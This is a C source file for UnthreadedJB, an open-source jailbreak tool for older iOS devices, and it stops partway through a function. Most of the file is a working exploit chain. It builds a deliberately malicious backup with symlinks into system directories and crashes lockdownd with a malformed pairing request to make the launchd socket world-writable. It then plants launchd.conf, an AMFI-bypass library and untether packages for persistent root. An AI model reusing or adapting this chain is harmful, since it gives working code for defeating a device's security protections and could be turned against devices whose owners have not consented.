/**
 * UnthreadedJB - jailbreak.c
 * Copyright (C) 2010 Joshua Hill
 * Exploits from evasi0n and absinthe2.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 **/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <dirent.h>

#include <signal.h>
#include <plist/plist.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/errno.h>

#include <assert.h>

#include <libimobiledevice/libimobiledevice.h>
#include <libimobiledevice/lockdown.h>
#include <libimobiledevice/mobilebackup2.h>
#include <libimobiledevice/notification_proxy.h>
#include <libimobiledevice/afc.h>
#include <libimobiledevice/sbservices.h>
#include <libimobiledevice/file_relay.h>

#include <zlib.h>

#include "common.h"

#define AFCTMP 	"HackStore"

typedef struct _compatibility {
    char *product;
    char *build;
} compatibility_t;

compatibility_t compatible_devices[] = {
    {"K93AP", "9A334"},
    {"K93AP", "9A405"},
    {"K93AP", "9B176"},
    {"K93AP", "9B206"},

    {"K94AP", "9A334"},
    {"K94AP", "9A405"},
    {"K94AP", "9B176"},
    {"K94AP", "9B206"},

    {"K95AP", "9A334"},
    {"K95AP", "9A405"},
    {"K95AP", "9B176"},
    {"K95AP", "9B206"},

    {"K93AAP", "9B176"},
    {"K93AAP", "9B206"},

    {"J1AP", "9B176"},
    {"J1AP", "9B206"},

    {"J2AP", "9B176"},
    {"J2AP", "9B206"},

    {"J2aAP", "9B176"},
    {"J2aAP", "9B206"},

    {"N94AP", "9A334"},
    {"N94AP", "9A405"},
    {"N94AP", "9A406"},
    {"N94AP", "9B179"},
    {"N94AP", "9B206"},

    {"N92AP", "9B176"},
    {"N90AP", "9B176"},
    {"N88AP", "9B176"},
    {"N18AP", "9B176"},
    {"N88AP", "9B176"},
    {"K48AP", "9B176"},

    {"N92AP", "9B206"},
    {"N90AP", "9B206"},
    {"N90AP", "9B208"},
    {"N88AP", "9B206"},
    {"N18AP", "9B206"},
    {"N88AP", "9B206"},
    {"K48AP", "9B206"},

    {"N92AP", "9A405"},
    {"N90AP", "9A405"},
    {"N88AP", "9A405"},
    {"N18AP", "9A405"},
    {"N88AP", "9A405"},
    {"K48AP", "9A405"},

    {"N92AP", "9A334"},
    {"N90AP", "9A334"},
    {"N88AP", "9A334"},
    {"N18AP", "9A334"},
    {"N88AP", "9A334"},
    {"K48AP", "9A334"},

    {"N90AP", "8L1"},
    {"N88AP", "8L1"},
    {"N18AP", "8L1"},
    {"N88AP", "8L1"},
    {"K48AP", "8L1"},

    {"N90AP", "8K2"},
    {"N88AP", "8K2"},
    {"N18AP", "8K2"},
    {"N88AP", "8K2"},
    {"K48AP", "8K2"},

    {NULL, NULL}
};

static int cpio_get_file_name_length(void *cpio)
{
    if (cpio) {
        char buffer[7];
        int val;

        memset(buffer, '\0', 7);

        memcpy(&buffer, (void *)(cpio + 59), 6);    /* File Name Length */

        val = strtoul(buffer, NULL, 8);
        return val;
    } else {
        return 0;
    }
}

static int cpio_get_file_length(void *cpio)
{
    if (cpio) {
        char buffer[12];
        int val;

        memset(buffer, '\0', 12);

        memcpy(&buffer, (void *)(cpio + 65), 11);   /* File Length */

        val = strtoul(buffer, NULL, 8);
        return val;
    } else {
        return 0;
    }
}

/* recursively remove path, including path */
static void rmdir_recursive(const char *path)
{                               /*{{{ */
    if (!path) {
        return;
    }
    DIR *cur_dir = opendir(path);
    if (cur_dir) {
        struct dirent *ep;
        while ((ep = readdir(cur_dir))) {
            if ((strcmp(ep->d_name, ".") == 0)
                || (strcmp(ep->d_name, "..") == 0)) {
                continue;
            }
            char *fpath =
                (char *)malloc(strlen(path) + 1 + strlen(ep->d_name) + 1);
            if (fpath) {
                struct stat st;
                strcpy(fpath, path);
                strcat(fpath, "/");
                strcat(fpath, ep->d_name);

                if ((stat(fpath, &st) == 0) && S_ISDIR(st.st_mode)) {
                    rmdir_recursive(fpath);
                } else {
                    if (remove(fpath) != 0) {
                        DEBUG("could not remove file %s: %s\n", fpath,
                              strerror(errno));
                    }
                }
                free(fpath);
            }
        }
        closedir(cur_dir);
    }
    if (rmdir(path) != 0) {
        fprintf(stderr, "could not remove directory %s: %s\n", path,
                strerror(errno));
    }
}                               /*}}} */

/* char** freeing helper function */
static void free_dictionary(char **dictionary)
{                               /*{{{ */
    int i = 0;

    if (!dictionary)
        return;

    for (i = 0; dictionary[i]; i++) {
        free(dictionary[i]);
    }
    free(dictionary);
}                               /*}}} */

/* recursively remove path via afc, (incl = 1 including path, incl = 0, NOT including path) */
static int rmdir_recursive_afc(afc_client_t afc, const char *path, int incl)
{                               /*{{{ */
    char **dirlist = NULL;
    if (afc_read_directory(afc, path, &dirlist) != AFC_E_SUCCESS) {
        //fprintf(stderr, "AFC: could not get directory list for %s\n", path);
        return -1;
    }
    if (dirlist == NULL) {
        if (incl) {
            afc_remove_path(afc, path);
        }
        return 0;
    }

    char **ptr;
    for (ptr = dirlist; *ptr; ptr++) {
        if ((strcmp(*ptr, ".") == 0) || (strcmp(*ptr, "..") == 0)) {
            continue;
        }
        char **info = NULL;
        char *fpath = (char *)malloc(strlen(path) + 1 + strlen(*ptr) + 1);
        strcpy(fpath, path);
        strcat(fpath, "/");
        strcat(fpath, *ptr);
        if ((afc_get_file_info(afc, fpath, &info) != AFC_E_SUCCESS) || !info) {
            // failed. try to delete nevertheless.
            afc_remove_path(afc, fpath);
            free(fpath);
            free_dictionary(info);
            continue;
        }

        int is_dir = 0;
        int i;
        for (i = 0; info[i]; i += 2) {
            if (!strcmp(info[i], "st_ifmt")) {
                if (!strcmp(info[i + 1], "S_IFDIR")) {
                    is_dir = 1;
                }
                break;
            }
        }
        free_dictionary(info);

        if (is_dir) {
            rmdir_recursive_afc(afc, fpath, 0);
        }
        afc_remove_path(afc, fpath);
        free(fpath);
    }

    free_dictionary(dirlist);
    if (incl) {
        afc_remove_path(afc, path);
    }

    return 0;
}                               /*}}} */

static int connected = 0;

void jb_device_event_cb(const idevice_event_t * event, void *user_data)
{
    char *uuid = (char *)user_data;
    DEBUG("device event %d: %s\n", event->event, event->udid);
    if (uuid && strcmp(uuid, event->udid))
        return;
    if (event->event == IDEVICE_DEVICE_ADD) {
        connected = 1;
    } else if (event->event == IDEVICE_DEVICE_REMOVE) {
        connected = 0;
    }
}

static void idevice_event_cb(const idevice_event_t * event, void *user_data)
{
    jb_device_event_cb(event, user_data);
}

typedef struct __csstores {
    uint32_t csstore_number;
} csstores_t;

static csstores_t csstores[16];
static int num_of_csstores = 0;

int check_consistency(char *product, char *build)
{
    struct stat buf;
    char prodstr[32];

    // Verify main directory exists
    snprintf(prodstr, 32, "payload/%s_%s", build, product);

    if (stat(prodstr, &buf) == -1) {
        ERROR("Failed to open directory \"payload/%s\"\n", prodstr);
    }
    // Seems legit.
    return 0;
}

int verify_product(char *product, char *build)
{
    compatibility_t *curcompat = &compatible_devices[0];
    while ((curcompat) && (curcompat->product != NULL)) {
        if (!strcmp(curcompat->product, product) &&
            !strcmp(curcompat->build, build))
            return 0;
        curcompat++;
    }
    return 1;
}

int main(int argc, char *argv[])
{
    device_t *device = NULL;
    char *uuid = NULL;
    char *product = NULL;
    char *build = NULL;
    int old_os = 0;

    /********************************************************/
    /* device detection */
    /********************************************************/
    if (!uuid) {
        device = device_create(NULL);
        if (!device) {
            ERROR("No device found, is it plugged in?\n");
        }
        uuid = strdup(device->uuid);
    } else {
        DEBUG("Detecting device...\n");
        device = device_create(uuid);
        if (device == NULL) {
            ERROR("Unable to connect to device\n");
        }
    }

    DEBUG("Connected to device with UUID %s\n", uuid);

    lockdown_t *lockdown = lockdown_open(device);
    if (lockdown == NULL) {
        ERROR("Lockdown connection failed\n");
        device_free(device);
        return -1;
    }

    if ((lockdown_get_string(lockdown, "HardwareModel", &product) !=
         LOCKDOWN_E_SUCCESS)
        || (lockdown_get_string(lockdown, "BuildVersion", &build) !=
            LOCKDOWN_E_SUCCESS)) {
        ERROR("Could not get device information\n");
        lockdown_free(lockdown);
        device_free(device);
        return -1;
    }

    DEBUG("Device is a %s with build %s\n", product, build);

    if (build[0] <= '8') {
        /* Too lazy to add Mbdx support for 4.3, otherwise this'd all work out of the box. */
        fprintf(stderr,
                "Installing an untether via this method will not work!\n"
                "For build %s, use Legacy iOS Kit. (iPad 2 on iOS 4.3.x is not compatible)\n",
                build);
        ERROR("Unsupported build\n");
    }

    if (verify_product(product, build) != 0) {
        ERROR("Device is not supported\n");
    }

    if (check_consistency(product, build) != 0) {
        ERROR("Failed consistency checks!\n");
    }

    plist_t pl = NULL;
    lockdown_get_value(lockdown, NULL, "ActivationState", &pl);
    if (pl && plist_get_node_type(pl) == PLIST_STRING) {
        char *as = NULL;
        plist_get_string_val(pl, &as);
        plist_free(pl);
        if (as) {
            if (strcmp(as, "Unactivated") == 0) {
                free(as);
                ERROR
                    ("The attached device is not activated. You need to activate it before it can be used with UnthreadedJB.\n");
                lockdown_free(lockdown);
                device_free(device);
                return -1;
            }
            free(as);
        }
    }

    pl = NULL;
    lockdown_get_value(lockdown, "com.apple.mobile.backup", "WillEncrypt", &pl);
    if (pl && plist_get_node_type(pl) == PLIST_BOOLEAN) {
        char c = 0;
        plist_get_bool_val(pl, &c);
        plist_free(pl);
        if (c) {
            ERROR
                ("You have a device backup password set. You need to disable the backup password in iTunes.\n");
            lockdown_free(lockdown);
            device_free(device);
            return -1;
        }
    }
    lockdown_free(lockdown);
    device_free(device);
    device = NULL;

    idevice_event_subscribe(idevice_event_cb, uuid);
    jailbreak_device(uuid);

    return 0;
}

static void plist_replace_item(plist_t plist, char *name, plist_t item)
{
    if (plist_dict_get_item(plist, name))
        plist_dict_remove_item(plist, name);
    plist_dict_set_item(plist, name, item);
}

void stroke_lockdownd(device_t * device)
{
    plist_t crashy = plist_new_dict();
    char *request = NULL;
    unsigned int size = 0;
    idevice_connection_t connection;
    uint32_t magic;
    uint32_t sent = 0;
    plist_dict_set_item(crashy, "Request", plist_new_string("Pair"));
    plist_dict_set_item(crashy, "PairRecord", plist_new_bool(0));
    plist_to_xml(crashy, &request, &size);

    magic = __builtin_bswap32(size);
    plist_free(crashy);

    if (idevice_connect(device->client, 62078, &connection)) {
        ERROR("Failed to connect to lockdownd.\n");
    }
    idevice_connection_send(connection, &magic, 4, &sent);
    idevice_connection_send(connection, request, size, &sent);

    idevice_connection_receive_timeout(connection, &size, 4, &sent, 1500);
    size = __builtin_bswap32(size);
    if (size) {
        void *ptr = malloc(size);
        idevice_connection_receive_timeout(connection, ptr, &size, &sent, 5000);
    }
    idevice_disconnect(connection);

    // XXX: Wait for lockdownd to start.
    sleep(5);
}

int jailbreak_device(const char *uuid)
{
    char backup_dir[1024];
    device_t *device = NULL;
    char *build = NULL;
    char *product = NULL;
    struct lockdownd_service_descriptor desc = { 0, 0 };

    if (!uuid) {
        ERROR("Missing device UDID\n");
    }

    strcpy(backup_dir, "/tmp/pris0nbarake");
    DEBUG("Backing up files to %s\n", backup_dir);

    // Wait for a connection
    DEBUG("Connecting to device...\n");

    int retries = 20;
    int i = 0;
    while (!connected && (i++ < retries)) {
        sleep(1);
    }

    if (!connected) {
        ERROR("Device connection failed\n");
    }
    // Open a connection to our device
    DEBUG("Opening connection to device\n");
    device = device_create(uuid);
    if (device == NULL) {
        ERROR("Unable to connect to device\n");
    }

    lockdown_t *lockdown = lockdown_open(device);
    if (lockdown == NULL) {
        WARN("Lockdown connection failed\n");
        device_free(device);
        return -1;
    }

    if ((lockdown_get_string(lockdown, "HardwareModel", &product) !=
         LOCKDOWN_E_SUCCESS)
        || (lockdown_get_string(lockdown, "BuildVersion", &build) !=
            LOCKDOWN_E_SUCCESS)) {
        ERROR("Could not get device information\n");
        if (product) {
            free(product);
        }
        if (build) {
            free(build);
        }
        lockdown_free(lockdown);
        device_free(device);
        return -1;
    }

    DEBUG("Device info: %s, %s\n", product, build);

    DEBUG("Beginning jailbreak, this may take a while...\n");

    /********************************************************/
    /* start AFC and move dirs out of the way */
    /********************************************************/
    uint16_t port = 0;
    if (lockdown_start_service(lockdown, "com.apple.afc2", &port) == 0) {
        char **fileinfo = NULL;
        uint32_t ffmt = 0;

        afc_client_t afc2 = NULL;
        desc.port = port;
        afc_client_new(device->client, &desc, &afc2);
        if (afc2) {
            afc_get_file_info(afc2, "/Applications", &fileinfo);
            if (fileinfo) {
                int i;
                for (i = 0; fileinfo[i]; i += 2) {
                    if (!strcmp(fileinfo[i], "st_ifmt")) {
                        if (strcmp(fileinfo[i + 1], "S_IFLNK") == 0) {
                            ffmt = 1;
                        }
                        break;
                    }
                }
                afc_free_dictionary(fileinfo);
                fileinfo = NULL;

                if (ffmt) {
                    ERROR("Device already jailbroken! Detected stash.\n");
                    afc_client_free(afc2);
                    lockdown_free(lockdown);
                    device_free(device);
                    return -1;
                }
            }

            afc_get_file_info(afc2, "/private/etc/launchd.conf", &fileinfo);
            if (fileinfo) {
                ERROR("Device already jailbroken! Detected untether.\n");
                afc_client_free(afc2);
                lockdown_free(lockdown);
                device_free(device);
                return -1;
            }

            afc_client_free(afc2);
        }
    }

    if (lockdown_start_service(lockdown, "com.apple.afc", &port) != 0) {
        ERROR("Failed to start AFC service\n", 0);
        lockdown_free(lockdown);
        device_free(device);
        return -1;
    }
    lockdown_free(lockdown);
    lockdown = NULL;

    afc_client_t afc = NULL;
    desc.port = port;
    afc_client_new(device->client, &desc, &afc);
    if (!afc) {
        ERROR("Could not connect to AFC service\n");
        device_free(device);
        return -1;
    }
    // check if directory exists
    char **list = NULL;
    if (afc_read_directory(afc, "/" AFCTMP, &list) != AFC_E_SUCCESS) {
        // we're good, directory does not exist.
    } else {
        free_dictionary(list);
        WARN("Looks like you attempted to apply this Jailbreak and it failed. Will try to fix now...\n", 0);
        sleep(5);
        goto fix;
    }

    afc_make_directory(afc, "/" AFCTMP);

    DEBUG("moving dirs aside...\n");
    afc_rename_path(afc, "/Books", "/" AFCTMP "/Books");
    afc_rename_path(afc, "/DCIM", "/" AFCTMP "/DCIM");
    afc_rename_path(afc, "/PhotoData", "/" AFCTMP "/PhotoData");
    afc_rename_path(afc, "/Photos", "/" AFCTMP "/Photos");
    afc_rename_path(afc, "/Recordings", "/" AFCTMP "/Recordings");

    afc_client_free(afc);
    afc = NULL;
    // TODO other paths?

    /********************************************************
	 * Get plist from ~/Library/Caches.
	 ********************************************************/
    plist_t mobile_install_plist = NULL;

    rmdir_recursive(backup_dir);
    mkdir(backup_dir, 0755);

    file_relay_client_t frc = NULL;
    idevice_connection_t dump = NULL;

    if (!lockdown)
        lockdown = lockdown_open(device);

    if (lockdown_start_service(lockdown, "com.apple.mobile.file_relay", &port)
        != 0) {
        ERROR("Failed to start File Relay\n");
        lockdown_free(lockdown);
        device_free(device);
        return -1;
    }

    desc.port = port;
    if (file_relay_client_new(device->client, &desc, &frc) !=
        FILE_RELAY_E_SUCCESS) {
        ERROR("Failed to start File Relay\n");
        return -1;
    }

    const char *sources[] = { "Caches", NULL };

    if (file_relay_request_sources(frc, sources, &dump) != FILE_RELAY_E_SUCCESS) {
        ERROR("could not get sources\n");
        return -1;
    }

    char tmpthing[1024];
    snprintf(tmpthing, 1024, "%s/dump.cpio.gz", backup_dir);

    FILE *f = fopen(tmpthing, "w");
    assert(f != NULL);
    int count = 0, length = 0;
    char buf[4096];

    memset(&csstores, '\0', sizeof(csstores));

    DEBUG("Getting information from file relay...\n");

    while (idevice_connection_receive(dump, buf, 4096, &length) ==
           IDEVICE_E_SUCCESS) {
        fwrite(buf, 1, length, f);
        count += length;
        length = 0;
    }
    fclose(f);

    if (count) {
        DEBUG("Decompressing dump.cpio.gz...\n");
        system("gzip -d /tmp/pris0nbarake/dump.cpio.gz");
        DEBUG("Extracting dump.cpio...\n");
        system("cpio -idv < /tmp/pris0nbarake/dump.cpio");
        DEBUG("Grabbing com.apple.mobile.installation.plist...\n");
        FILE *newf = fopen("var/mobile/Library/Caches/com.apple.mobile.installation.plist", "rb");
        assert(newf != NULL);
        fseek(newf, 0, SEEK_END);
        long newfsize = ftell(newf);
        fseek(newf, 0, SEEK_SET);

        void *filebuf = malloc(newfsize);
        fread(filebuf, newfsize, 1, newf);
        fclose(newf);

        if (newfsize <= 0)
            ERROR("Woah, what happened during reading?\n");

        if (!memcmp(filebuf, "bplist00", 8)) {
            DEBUG("com.apple.mobile.installation.plist is bplist\n");
            plist_from_bin(filebuf, newfsize, &mobile_install_plist);
        } else {
            DEBUG("com.apple.mobile.installation.plist is xml\n");
            plist_from_xml(filebuf, newfsize, &mobile_install_plist);
        }
    }

    if (frc) {
        file_relay_client_free(frc);
    }

    lockdown_free(NULL);
    lockdown = NULL;

    /*****
	 * Modify com.apple.mobile whatever installation plist.
	 *****/
    assert(mobile_install_plist != NULL);
    {
        plist_t system_plist =
            plist_access_path(mobile_install_plist, 2, "System",
                              "com.apple.DemoApp");
        if (system_plist) {
            plist_dict_remove_item(system_plist, "ApplicationType");
            plist_dict_remove_item(system_plist, "SBAppTags");
            plist_replace_item(system_plist, "Path",
                               plist_new_string("/var/mobile/DemoApp.app"));

            plist_t environment_dict = plist_new_dict();
            plist_dict_set_item(environment_dict, "LAUNCHD_SOCKET",
                                   plist_new_string
                                   ("/private/var/tmp/launchd/sock"));
            plist_replace_item(system_plist, "EnvironmentVariables",
                               environment_dict);
        } else {
            ERROR("Could not find com.apple.DemoApp in plist.\n");
        }
    }

    /********************************************************/
    /* make backup */
    /********************************************************/

    char *bargv[] = {
        "idevicebackup2",
        "backup",
        backup_dir,
        NULL
    };
    idevicebackup2(3, bargv);

    backup_t *backup = backup_open(backup_dir, uuid);
    if (!backup) {
        fprintf(stderr, "ERROR: failed to open backup\n");
        return -1;
    }

    /**
	 * Make the backup EVIL. Part 1.
	 */
    {
        if (backup_mkdir
            (backup, "MediaDomain", "Media/Recordings", 0755, 501, 501,
             4) != 0) {
            ERROR("Could not make folder\n");
        }

        if (backup_symlink
            (backup, "MediaDomain", "Media/Recordings/.haxx", "/var/mobile",
             501, 501, 4) != 0) {
            ERROR("Failed to symlink /var/mobile!\n");
        }

        if (backup_mkdir
            (backup, "MediaDomain", "Media/Recordings/.haxx/DemoApp.app", 0755,
             501, 501, 4) != 0) {
            ERROR("Could not make folder\n");
        }
#define ADD_FILE(path) 																							\
		if(backup_add_file_from_path(backup, "MediaDomain", "payload/Unthread.app/" path, 						\
			                         "Media/Recordings/.haxx/DemoApp.app/" path, 0100644, 501, 501, 4) != 0) {	\
			ERROR("Could not add" path); 																		\
		}

#define ADD_FILE_EXEC(path) 																					\
		if(backup_add_file_from_path(backup, "MediaDomain", "payload/Unthread.app/" path, 						\
			                         "Media/Recordings/.haxx/DemoApp.app/" path, 0100755, 501, 501, 4) != 0) { 	\
			ERROR("Could not add" path); 																		\
		}

        ADD_FILE("Info.plist");
        ADD_FILE_EXEC("DemoApp");
        ADD_FILE("Icon-72.png");
        ADD_FILE("Icon-72@2x.png");
        ADD_FILE("Icon.png");
        ADD_FILE("Icon@2x.png");

#undef ADD_FILE
#undef ADD_FILE_EXEC

        char *plist_data = NULL;
        unsigned int plist_size = 0;

        plist_to_xml(mobile_install_plist, &plist_data, &plist_size);

        if (backup_add_file_from_data
            (backup, "MediaDomain", plist_data, plist_size,
             "Media/Recordings/.haxx/Library/Caches/com.apple.mobile.installation.plist",
             0100644, 501, 501, 4) != 0) {
            ERROR("Could not add installation plist!\n");
        }

        plist_free(mobile_install_plist);
    }

    /********************************************************/
    /* restore backup */
    /********************************************************/
    DEBUG
        ("Sending initial data. Your device will appear to be restoring a backup, this may also take a while...");
    char *rargv[] = {
        "idevicebackup2",
        "restore",
        "--system",
        "--settings",
        "--reboot",
        backup_dir,
        NULL
    };
    idevicebackup2(6, rargv);

    backup_free(backup);

    afc_client_free(afc);
    afc = NULL;

    DEBUG("Waiting for reboot, not done yet, don't unplug your device yet!\n");

    /********************************************************/
    /* wait for device reboot */
    /********************************************************/

    // wait for disconnect
    while (connected) {
        sleep(2);
    }
    DEBUG("Device %s disconnected\n", uuid);

    // wait for device to connect
    while (!connected) {
        sleep(2);
    }
    DEBUG("Device %s detected. Connecting...\n", uuid);
    sleep(10);

    /********************************************************/
    /* wait for device to finish booting to springboard */
    /********************************************************/
    device = device_create(uuid);
    if (!device) {
        ERROR("ERROR: Could not connect to device. Aborting.\n");
        // we can't recover since the device connection failed...
        return -1;
    }

    lockdown = lockdown_open(device);
    if (!lockdown) {
        device_free(device);
        ERROR("ERROR: Could not connect to lockdown. Aborting.\n");
        // we can't recover since the device connection failed...
        return -1;
    }

    retries = 100;
    int done = 0;
    sbservices_client_t sbsc = NULL;
    plist_t state = NULL;

    DEBUG("Waiting for SpringBoard...\n");

    while (!done && (retries-- > 0)) {
        port = 0;
        lockdown_start_service(lockdown, "com.apple.springboardservices",
                               &port);
        if (!port) {
            continue;
        }
        sbsc = NULL;
        desc.port = port;

        sbservices_client_new(device->client, &desc, &sbsc);
        if (!sbsc) {
            continue;
        }
        if (sbservices_get_icon_state(sbsc, &state, "2") ==
            SBSERVICES_E_SUCCESS) {
            plist_free(state);
            state = NULL;
            done = 1;
        }
        sbservices_client_free(sbsc);
        if (done) {
            DEBUG("bootup complete\n");
            break;
        }
        sleep(3);
    }
    lockdown_free(lockdown);
    lockdown = NULL;

    /**
	 * Change to /var/db/timezone thingy.
	 */
    rmdir_recursive(backup_dir);
    mkdir(backup_dir, 0755);

    if (!afc) {
        lockdown = lockdown_open(device);
        port = 0;
        if (lockdown_start_service(lockdown, "com.apple.afc", &port) != 0) {
            WARN("Could not start AFC service. Aborting.\n");
            lockdown_free(lockdown);
            goto leave;
        }
        lockdown_free(lockdown);

        desc.port = port;
        afc_client_new(device->client, &desc, &afc);
        if (!afc) {
            WARN("Could not connect to AFC. Aborting.\n");
            goto leave;
        }
    }
    rmdir_recursive_afc(afc, "/Recordings", 1);
    idevicebackup2(3, bargv);

    backup = backup_open(backup_dir, uuid);
    if (!backup) {
        fprintf(stderr, "ERROR: failed to open backup\n");
        return -1;
    }

    /* Make the folders */
    {
        if (backup_mkdir
            (backup, "MediaDomain", "Media/Recordings", 0755, 501, 501,
             4) != 0) {
            ERROR("Could not make folder\n");
        }

        if (backup_symlink
            (backup, "MediaDomain", "Media/Recordings/.haxx", "/var/db", 501,
             501, 4) != 0) {
            ERROR("Failed to symlink /var/db!\n");
        }

        if (backup_symlink
            (backup, "MediaDomain", "Media/Recordings/.haxx/timezone",
             "/var/tmp/launchd", 501, 501, 4) != 0) {
            ERROR("Failed to symlink /var/tmp/launchd!\n");
        }
    }
    char *rargv2[] = {
        "idevicebackup2",
        "restore",
        "--system",
        "--settings",
        backup_dir,
        NULL
    };
    idevicebackup2(5, rargv2);

    backup_free(backup);

    /*
     * Crash lockdownd.
     */
    stroke_lockdownd(device);

    rmdir_recursive(backup_dir);
    mkdir(backup_dir, 0755);

    if (!afc) {
        lockdown = lockdown_open(device);
        port = 0;
        if (lockdown_start_service(lockdown, "com.apple.afc", &port) != 0) {
            WARN("Could not start AFC service. Aborting.\n");
            lockdown_free(lockdown);
            goto leave;
        }
        lockdown_free(lockdown);

        desc.port = port;
        afc_client_new(device->client, &desc, &afc);
        if (!afc) {
            WARN("Could not connect to AFC. Aborting.\n");
            goto leave;
        }
    }
    rmdir_recursive_afc(afc, "/Recordings", 1);
    idevicebackup2(3, bargv);

    backup = backup_open(backup_dir, uuid);
    if (!backup) {
        fprintf(stderr, "ERROR: failed to open backup\n");
        return -1;
    }

    /*
     * Do it again.
     */
    {
        if (backup_mkdir
            (backup, "MediaDomain", "Media/Recordings", 0755, 501, 501,
             4) != 0) {
            ERROR("Could not make folder\n");
        }

        if (backup_symlink
            (backup, "MediaDomain", "Media/Recordings/.haxx", "/var/db", 501,
             501, 4) != 0) {
            ERROR("Failed to symlink /var/db!\n");
        }

        if (backup_symlink
            (backup, "MediaDomain", "Media/Recordings/.haxx/timezone",
             "/var/tmp/launchd/sock", 501, 501, 4) != 0) {
            ERROR("Failed to symlink /var/tmp/launchd/sock!\n");
        }
    }
    idevicebackup2(5, rargv2);

    backup_free(backup);

    /*
     * Crash lockdownd.
     */
    stroke_lockdownd(device);

    /*
     * Now, the lockdown socket is 777.
     * XXX: Replace getchar() with stat("/var/mobile/Media/mount.stderr") or whatever.
     */
    WARN("Please run the #Unthread application to remount the root filesystem as read/write. Hit a key to continue when done.\n");
    WARN("Yes, the app is supposed to crash. Don't worry about it.\n");
    getchar();

    /*
     * Goody, goody. Let's copy everything over!
     */

    rmdir_recursive(backup_dir);
    mkdir(backup_dir, 0755);

    if (!afc) {
        lockdown = lockdown_open(device);
        port = 0;
        if (lockdown_start_service(lockdown, "com.apple.afc", &port) != 0) {
            WARN("Could not start AFC service. Aborting.\n");
            lockdown_free(lockdown);
            goto leave;
        }
        lockdown_free(lockdown);

        desc.port = port;
        afc_client_new(device->client, &desc, &afc);
        if (!afc) {
            WARN("Could not connect to AFC. Aborting.\n");
            goto leave;
        }
    }
    rmdir_recursive_afc(afc, "/Recordings", 1);
    idevicebackup2(3, bargv);

    backup = backup_open(backup_dir, uuid);
    if (!backup) {
        fprintf(stderr, "ERROR: failed to open backup\n");
        return -1;
    }

    /*
     * Do it again.
     */
    {
        if (backup_mkdir(backup, "MediaDomain", "Media/Recordings", 0755, 501, 501, 4) != 0) {
            ERROR("Could not make folder\n");
        }

        if (backup_symlink(backup, "MediaDomain", "Media/Recordings/.haxx", "/", 501, 501, 4) != 0) {
            ERROR("Failed to symlink root!\n");
        }

        if (backup_mkdir(backup, "MediaDomain", "Media/Recordings/.haxx/var/unthreadedjb", 0755, 0, 0, 4) != 0) {
            ERROR("Could not make var/unthreadedjb folder\n");
        }

        if (backup_mkdir(backup, "MediaDomain", "Media/Recordings/.haxx/var/root", 0755, 0, 0, 4) != 0) {
            ERROR("Could not make var/root folder\n");
        }

        if (backup_mkdir(backup, "MediaDomain", "Media/Recordings/.haxx/var/root/Media", 0755, 0, 0, 4) != 0) {
            ERROR("Could not make var/root/Media folder\n");
        }

        if (backup_mkdir(backup, "MediaDomain", "Media/Recordings/.haxx/var/root/Media/Cydia", 0755, 0, 0, 4) != 0) {
            ERROR("Could not make var/root/Media/Cydia folder\n");
        }

        if (backup_mkdir(backup, "MediaDomain", "Media/Recordings/.haxx/var/root/Media/Cydia/AutoInstall", 0755, 0, 0, 4) != 0) {
            ERROR("Could not make var/root/Media/Cydia/AutoInstall folder\n");
        }

        {
            char jb_path[128];
            char amfi_path[128];
            char launchd_conf_path[128];
            char untether_deb_path[128];

            snprintf(jb_path, 128, "payload/%s_%s/jb", build, product);
            snprintf(amfi_path, 128, "payload/amfi.dylib");
            snprintf(launchd_conf_path, 128, "payload/launchd.conf");

            if (backup_add_file_from_path(backup, "MediaDomain", launchd_conf_path,
                 "Media/Recordings/.haxx/var/unthreadedjb/launchd.conf",
                 0100644, 0, 0, 4) != 0) {
                ERROR("Could not add launchd.conf\n");
            }
            if (backup_symlink(backup, "MediaDomain", "Media/Recordings/.haxx/private/etc/launchd.conf",
                 "/private/var/unthreadedjb/launchd.conf", 0, 0, 4) != 0) {
                ERROR("Failed to symlink launchd.conf!\n");
            }
            if (backup_add_file_from_path(backup, "MediaDomain", jb_path,
                 "Media/Recordings/.haxx/var/unthreadedjb/jb",
                 0100755, 0, 0, 4) != 0) {
                ERROR("Could not add jb\n");
            }
            if (backup_add_file_from_path(backup, "MediaDomain", amfi_path,
                 "Media/Recordings/.haxx/var/unthreadedjb/amfi.dylib",
                 0100755, 0, 0, 4) != 0) {
                ERROR("Could not add amfi\n");
            }
            if (backup_add_file_from_path
                (backup, "MediaDomain", "payload/Cydia.tar",
                  "Media/Recordings/.haxx/var/unthreadedjb/Cydia.tar", 0100644,
                  0, 0, 4) != 0) {
                ERROR("Could not add Cydia\n");
            }
            if (strcmp(build, "9A405") == 0 || strcmp(build, "9A406") == 0) {
                snprintf(untether_deb_path, 128, "payload/corona.deb");
                if (backup_add_file_from_path(backup, "MediaDomain", untether_deb_path,
                                               "Media/Recordings/.haxx/var/root/Media/Cydia/AutoInstall/untether.deb",
                                               0100755, 0, 0, 4) != 0) {
                    ERROR("Could not add corona untether\n");
                }
            }
            if (strcmp(build, "9B206") == 0 || strcmp(build, "9B208") == 0) {
                snprintf(untether_deb_path, 128, "payload/rockyracoon.deb");
                if (backup_add_file_from_path(backup, "MediaDomain", untether_deb_path,
                                               "Media/Recordings/.haxx/var/root/Media/Cydia/AutoInstall/untether.deb",
                                               0100755, 0, 0, 4) != 0) {
                    ERROR("Could not add rockyracoon untether\n");
                }
            }
        }
    }
    idevicebackup2(5, rargv2);

    backup_free(backup);

    DEBUG("Installed jailbreak successfully.\n");

    /********************************************************/
    /* move back any remaining dirs via AFC */
    /********************************************************/
 fix:
    DEBUG("Moving files...\n", 80);
    if (!afc) {
        lockdown = lockdown_open(device);
        port = 0;
        if (lockdown_start_service(lockdown, "com.apple.afc", &port) != 0) {
            WARN("Could not start AFC service. Aborting.\n");
            lockdown_free(lockdown);
            goto leave;
        }
        lockdown_free(lockdown);

        desc.port = port;
        afc_client_new(device->client, &desc, &afc);
        if (!afc) {
            WARN("Could not connect to AFC. Aborting.\n");
            goto leave;
        }
    }

    list = NULL;
    if (afc_read_directory(afc, "/" AFCTMP, &list) != AFC_E_SUCCESS) {
